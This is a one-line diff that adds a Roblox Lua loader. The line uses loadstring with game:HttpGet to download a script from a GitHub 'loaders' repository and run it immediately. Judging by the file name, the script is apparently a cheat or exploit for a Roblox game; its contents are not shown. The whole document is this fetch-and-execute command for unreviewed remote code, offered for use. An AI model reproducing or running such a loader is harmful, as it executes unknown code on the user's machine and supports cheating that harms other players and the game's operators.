@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/build-a-base-steal-plants-co-op-spam6-drwlzu1oie0r08.lua"))()
